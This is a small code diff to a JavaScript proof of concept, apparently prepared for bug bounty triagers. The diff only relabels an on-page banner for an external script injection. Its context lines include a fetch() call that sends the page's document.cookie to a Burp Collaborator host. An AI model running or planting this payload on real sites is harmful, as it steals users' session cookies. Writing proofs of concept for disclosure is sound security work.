@@ -1,5 +1,5 @@
 // Visual banner for triagers
-document.body.innerHTML += "<h1 style='color:red'>[POC] External JS Injection</h1>";
+document.body.innerHTML += "<h1 style='color:red'>[NET POC] External JS Injection</h1>";
 
 // Exfiltrate cookies to Burp Collaborator
 fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?cookie=" + encodeURIComponent(document.cookie));
